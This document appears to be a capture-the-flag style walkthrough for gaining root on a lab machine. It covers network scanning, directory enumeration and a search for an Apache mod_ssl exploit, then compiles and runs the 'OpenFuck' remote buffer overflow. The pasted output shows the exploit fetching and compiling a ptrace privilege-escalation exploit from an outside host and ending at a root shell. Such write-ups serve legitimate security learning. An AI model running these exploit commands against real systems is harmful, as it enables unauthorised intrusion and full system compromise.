@@ -1,0 +1,106 @@
+Objective of the box is to get root access. Let try: 
+
+1. arp-scan --local : To find the IP address of the box
+
+2. nmap -sC -sV -T4 -p- 192.168.1.xxx : Nmap command to find out the info of the box.
+
+3. dir -u  192.168.1.xxx  -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt : To find out the directories of the box.
+/mrtg (Status: 301)
+/manual (Status: 301)
+/usage (Status: 301)
+
+4. http://192.168.1.xxx/robots.txt : was used to find out the file but no luck.
+
+5. since, the machine was linux :
+
+enum4linux 192.168.1.xxx was used to enumerate the box.
+
+6. Via nmap mod_ssl/2.8.4 was found, so lets search for the exploit: 
+
+7. searchsploit mod_ssl was used to find out the exploit and we found 
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                            | unix/remote/764.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                           | unix/remote/47080.c
+There were two exploit but (1) threw some error and (2) was more updated so (2) was the best exploit for me.
+
+8.Now lets locate the (2) from and copy: 
+"locate unix/remote/47080.c" 
+
+9.Now let copy the exploit into the /Desktop so that I'll be easy.
+"cp /usr/share/exploitdb/exploits/unix/remote/47080.c /home/sumedh/Desktop was used" 
+
+10,After cp the exploit lets compile to exploit into C 
+gcc -o sumedh 47080.c -lcrypto 
+Here, 74080 is renamed as sumedh. 
+
+11.Since I'm using Kali-linux ./sumedh is used to execute the exploit. 
+# "./sumedh"     
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./sumedh target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+
+12. Since from namp we can find our machine was RedHat Linux 7.2 (apache-1.3.20-16)2 : we found the same from the exploit.
+
+13. Let exploit the box now: 
+command to run the exploit : ./sumedh target box [port] [-c N]
+./sumedh 0x6b 192.168.1.104 -c 50 
+here, i didnt specify the port. 
+
+14. We got the shell: 
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
+--00:52:09--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   1.87 MB/s
+
+00:52:11 (765.82 KB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+gcc: file path prefix `/usr/bin' never used
+[+] Attached to 6378
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+
+15: lets check if we are root or not: 
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+16: Yes we are root. 
+17. Happy learning.
+-------------------------------------------------------------Sumedh Dawadi---------------------------------------------------------
+
+
+  
